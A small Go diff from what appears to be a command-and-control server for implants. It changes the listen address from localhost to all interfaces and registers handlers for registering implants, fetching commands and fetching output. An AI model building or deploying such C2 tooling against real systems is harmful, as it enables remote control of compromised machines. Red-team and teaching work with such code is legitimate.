@@ -30,7 +30,7 @@ func main() {
 		panic(err)
 	}
 
-	var socket = "127.0.0.1:8081"
+	var socket = ":8081"
 	http.HandleFunc("/registerNewImplant", registerNewImplant)
 	http.HandleFunc("/fetchCommand", fetchCommand)
 	http.HandleFunc("/fetchOutput", fetchOutput)
